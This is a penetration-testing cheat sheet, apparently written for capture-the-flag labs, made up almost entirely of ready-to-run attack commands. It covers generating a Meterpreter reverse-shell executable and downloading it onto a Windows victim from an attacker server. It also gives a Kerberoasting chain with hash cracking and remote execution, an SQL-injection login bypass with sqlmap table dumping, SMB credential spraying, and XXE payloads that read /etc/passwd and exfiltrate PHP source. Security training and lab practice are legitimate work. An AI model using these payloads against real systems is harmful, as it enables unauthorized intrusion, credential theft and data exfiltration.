# Web Exploitation

## local_exploit_suggester (windows)

1. Have access to the victim machine terminal
2. msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<ip, different from shell listener> -f exe > shell.exe # Generate a shell exe
3. msfconsole
4. > use multi/handler
5. > set payload windows/meterpreter/reverse_tcp # or "set payload windows/x64/meterpreter/reverse_https" if not compatible
6. > set lhost tun0
7. > set lport <ip, different from shell listener>
8. > exploit
9. > migrate <explorer.exe pid> # migrate to x64 architecture by getting explorer.exe's pid 
10. python -m http.server <python port> # host python server on local for receiving the shell.exe from step 2
11. powershell "(new-object System.Net.WebClient).Downloadfile('http://<ip>:<python port>/shell.exe', 'shell.exe')" # from windows machine
12. .\shell.exe
13. run post/multi/recon/local_exploit_suggester # from meterpreter



## Deobfuscate JS code
https://matthewfl.com/unPacker.html

## Windows Attack Path:

# Foothold
1. smbclient -L //<target>/ -N # SMB anonymous Login
2. Look for creds
3. smbmap -H <ip> -u <user> -p <pass> # Map out what the user can access
4. smbclient //<ip>/<New Share> -U "<user>" # Access new share
5. Sometimes can get flag from here

# PrivEsc (Kerberoast, 88.)
1. ldapsearch -x -H ldap://<ip> -D "<user>" -w '<password>' -b "DC=active,DC=htb" # LDAP Search
1.5 ldapsearch -x -H ldap://<ip> -D "<user>" -w '<password>' -b "DC=active,DC=htb"  -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName # LDAP Search for active accounts
2. GetADUsers.py -all <domain.htb>/<user> -dc-ip <ip>
3. ldapsearch -x -H ldap://<ip> -D "<user>" -w '<password>' -b "DC=active,DC=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName # Use to get accounts with SPN. Needed for Kerberoasting
4. GetUserSPNs.py <domain.htb>/<user> -dc-ip <ip> -request # Request Kerberos Hash
5. hashcat -m 13100 <hash file> --wordlist rockyou.txt --force --potfile-disable # Crack the hash
6. wmiexec.py <domain.htb>/<new user>:<cracked hash>@<ip>


## SqlMap

Try to bypass, if possible:
<username>'-- -
<fake pass>

Get Request from Burp (Proxy request, send to repeater, copy all text, r-c copy to file)
sqlmap -r <req file> -p <POST Parameter> --batch --level 3 (--dbs)
sqlmap -r <req file> -p <POST Parameter> --batch --level 3 -D <db name> --tables
sqlmap -r <req file> -p <POST Parameter> --batch --level 3 -D <db name> -T <table name> --columns
OR
sqlmap -r reset.req -p email --batch --level 3 -D <db name> -T <table name> --dump

## 135, 445, 5985 smb:

1. Get possible creds/Crack hashes (from site, )
2. try evil-rm
3. try crackmapexec to enumerate logins/users
4. Keep running crackmapexec with old users/pass on new users/pass

## XXE:

### To Test:

<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>

### To Get PHP File

<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
		<bugreport>
		<title>test</title>
 		<cwe>test</cwe>
 		<cvss>test</cvss>
	 	<reward>&file;</reward>
		</bugreport>
